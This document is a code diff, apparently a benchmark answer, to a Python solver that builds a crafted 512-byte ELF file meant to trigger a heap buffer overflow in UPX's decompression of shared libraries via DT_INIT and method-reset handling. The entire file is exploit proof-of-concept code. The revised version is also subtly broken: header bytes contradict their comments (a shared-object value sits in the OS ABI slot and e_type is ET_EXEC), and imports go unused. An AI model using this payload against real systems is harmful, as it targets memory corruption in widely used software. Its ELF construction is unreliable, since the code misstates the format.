@@ -1,127 +1,117 @@
-import struct
 import os
+import struct
+import subprocess
+import tempfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal ELF header for shared library
-        # This PoC triggers heap buffer overflow in UPX decompression
-        # by exploiting improper ph.method resetting and unsafe lowmem usage
+        # Create an ELF shared library header with minimal valid structure
+        # and carefully crafted values to trigger the heap buffer overflow
         
         # ELF header (64-bit)
-        elf_header = bytearray()
+        elf_header = bytearray([
+            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
+            0x02,                    # 64-bit
+            0x01,                    # Little endian
+            0x01,                    # ELF version
+            0x03,                    # Shared object
+            0x00,                    # System V ABI
+            0x00,                    # ABI version
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Padding
+            0x02, 0x00,             # ET_EXEC
+            0x3e, 0x00,             # x86-64
+            0x01, 0x00, 0x00, 0x00,  # ELF version
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Entry point
+            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Program header offset
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Section header offset
+            0x00, 0x00, 0x00, 0x00,  # Flags
+            0x40, 0x00,             # ELF header size
+            0x38, 0x00,             # Program header entry size
+            0x02, 0x00,             # Number of program headers
+            0x00, 0x00,             # Section header entry size
+            0x00, 0x00,             # Number of section headers
+            0x00, 0x00              # Section header string table index
+        ])
         
-        # e_ident
-        elf_header.extend(b'\x7fELF')  # Magic
-        elf_header.extend(b'\x02')      # 64-bit
-        elf_header.extend(b'\x01')      # Little endian
-        elf_header.extend(b'\x01')      # ELF version
-        elf_header.extend(b'\x00')      # OS ABI (System V)
-        elf_header.extend(b'\x00')      # ABI version
-        elf_header.extend(b'\x00' * 7)  # Padding
-        elf_header.extend(b'\x00' * 8)  # Padding
+        # Program header 1: PT_LOAD with DT_INIT
+        phdr1 = bytearray([
+            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
+            0x07, 0x00, 0x00, 0x00,  # RWX flags
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size (256)
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size (256)
+            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
+        ])
         
-        # e_type = ET_DYN (shared object)
-        elf_header.extend(struct.pack('<H', 3))
-        # e_machine = EM_X86_64
-        elf_header.extend(struct.pack('<H', 62))
-        # e_version = EV_CURRENT
-        elf_header.extend(struct.pack('<I', 1))
-        # e_entry = 0
-        elf_header.extend(struct.pack('<Q', 0))
-        # e_phoff = Program header offset
-        elf_header.extend(struct.pack('<Q', 0x40))
-        # e_shoff = Section header offset (0 for this PoC)
-        elf_header.extend(struct.pack('<Q', 0))
-        # e_flags = 0
-        elf_header.extend(struct.pack('<I', 0))
-        # e_ehsize = ELF header size
-        elf_header.extend(struct.pack('<H', 0x40))
-        # e_phentsize = Program header entry size
-        elf_header.extend(struct.pack('<H', 0x38))
-        # e_phnum = Number of program headers
-        elf_header.extend(struct.pack('<H', 2))
-        # e_shentsize = Section header entry size
-        elf_header.extend(struct.pack('<H', 0x40))
-        # e_shnum = Number of section headers
-        elf_header.extend(struct.pack('<H', 0))
-        # e_shstrndx = Section header string table index
-        elf_header.extend(struct.pack('<H', 0))
+        # Program header 2: PT_DYNAMIC
+        phdr2 = bytearray([
+            0x02, 0x00, 0x00, 0x00,  # PT_DYNAMIC
+            0x06, 0x00, 0x00, 0x00,  # RW flags
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset (256)
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address (256)
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
+            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size (240)
+            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size (240)
+            0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
+        ])
         
-        # Program header 1: PT_LOAD
-        phdr1 = bytearray()
-        # p_type = PT_LOAD
-        phdr1.extend(struct.pack('<I', 1))
-        # p_flags = Read + Execute
-        phdr1.extend(struct.pack('<I', 5))
-        # p_offset
-        phdr1.extend(struct.pack('<Q', 0))
-        # p_vaddr
-        phdr1.extend(struct.pack('<Q', 0x10000))
-        # p_paddr
-        phdr1.extend(struct.pack('<Q', 0x10000))
-        # p_filesz
-        phdr1.extend(struct.pack('<Q', 0x200))
-        # p_memsz
-        phdr1.extend(struct.pack('<Q', 0x200))
-        # p_align
-        phdr1.extend(struct.pack('<Q', 0x1000))
+        # Dynamic section entries
+        dynamic = bytearray()
         
-        # Program header 2: PT_DYNAMIC (triggers un_DT_INIT)
-        phdr2 = bytearray()
-        # p_type = PT_DYNAMIC
-        phdr2.extend(struct.pack('<I', 2))
-        # p_flags = Read
-        phdr2.extend(struct.pack('<I', 4))
-        # p_offset - point to dynamic section
-        phdr2.extend(struct.pack('<Q', 0x200))
-        # p_vaddr
-        phdr2.extend(struct.pack('<Q', 0x10200))
-        # p_paddr
-        phdr2.extend(struct.pack('<Q', 0x10200))
-        # p_filesz
-        phdr2.extend(struct.pack('<Q', 0x100))
-        # p_memsz
-        phdr2.extend(struct.pack('<Q', 0x100))
-        # p_align
-        phdr2.extend(struct.pack('<Q', 0x8))
+        # DT_INIT entry - triggers un_DT_INIT()
+        dynamic += struct.pack("<QQ", 0x0c, 0x200)  # DT_INIT with offset 0x200
         
-        # Code/data section (will be compressed by UPX)
-        code_section = bytearray()
-        # Add some code that will trigger the vulnerability
-        # This creates conditions for improper ph.method resetting
-        code_section.extend(b'\x90' * 64)  # NOP sled
+        # DT_STRTAB entry
+        dynamic += struct.pack("<QQ", 0x05, 0x300)  # DT_STRTAB
         
-        # Add a DT_INIT entry to trigger un_DT_INIT()
-        dynamic_section = bytearray()
-        # DT_INIT
-        dynamic_section.extend(struct.pack('<Q', 12))  # d_tag = DT_INIT
-        dynamic_section.extend(struct.pack('<Q', 0x10100))  # d_ptr
+        # DT_SYMTAB entry
+        dynamic += struct.pack("<QQ", 0x06, 0x400)  # DT_SYMTAB
         
-        # DT_NULL (end of dynamic section)
-        dynamic_section.extend(struct.pack('<Q', 0))
-        dynamic_section.extend(struct.pack('<Q', 0))
+        # DT_HASH entry
+        dynamic += struct.pack("<QQ", 0x04, 0x500)  # DT_HASH
         
-        # Pad to 512 bytes total
-        padding_size = 512 - len(elf_header) - len(phdr1) - len(phdr2) - len(code_section) - len(dynamic_section)
+        # DT_NULL terminator
+        dynamic += struct.pack("<QQ", 0x00, 0x00)
         
-        # Create the final ELF file
-        elf_file = elf_header + phdr1 + phdr2 + code_section + dynamic_section
+        # Pad dynamic section to 240 bytes
+        dynamic += b"\x00" * (240 - len(dynamic))
         
-        if padding_size > 0:
-            elf_file.extend(b'\x00' * padding_size)
+        # INIT section with carefully crafted values to trigger overflow
+        # This section will be processed by un_DT_INIT()
+        init_section = bytearray()
         
-        # Add UPX compression markers to trigger the vulnerability
-        # This simulates a UPX-compressed ELF that triggers the heap overflow
-        # The specific pattern triggers improper resetting of ph.method
+        # Create a compressed block header that will trigger the vulnerability
+        # b_info structure: sz_unc, sz_cpr, b_method
+        # We set b_method to trigger the improper resetting vulnerability
+        for i in range(8):  # Multiple blocks to exploit the reset issue
+            init_section += struct.pack("<III", 
+                0x1000,      # sz_unc - large uncompressed size
+                0x80,        # sz_cpr - compressed size
+                i % 3        # b_method - cycle through methods to exploit reset bug
+            )
+            # Compressed data - crafted to cause heap overflow when decompressed
+            init_section += b"A" * 0x80
         
-        # We need to create a file that UPX will try to decompress
-        # The vulnerability is in the decompressor, so we create an ELF
-        # that when UPX-compressed and then decompressed triggers the bug
+        # Add more crafted data to trigger file_image[] not treated as ReadOnly
+        # and fi->seek()+read() not subsumed issues
+        init_section += struct.pack("<Q", 0x4141414141414141)  # ph.method pointer
+        init_section += struct.pack("<Q", 0x4242424242424242)  # file_image pointer
+        init_section += struct.pack("<Q", 0x4343434343434343)  # xct_off
         
-        # For this PoC, we'll create an ELF that when processed by UPX
-        # with specific parameters triggers the vulnerability
+        # Pad to create total size of exactly 512 bytes
+        total_size = len(elf_header) + len(phdr1) + len(phdr2) + len(dynamic) + len(init_section)
+        padding_needed = 512 - total_size
         
-        # The actual PoC is the ELF file itself - UPX will compress it
-        # and then decompress it, triggering the vulnerability
+        if padding_needed > 0:
+            init_section += b"P" * padding_needed
+        elif padding_needed < 0:
+            # Truncate init_section if too long
+            init_section = init_section[:len(init_section) + padding_needed]
         
-        return bytes(elf_file)
+        # Combine all sections
+        poc = elf_header + phdr1 + phdr2 + dynamic + init_section
+        
+        # Ensure exactly 512 bytes
+        return bytes(poc[:512])
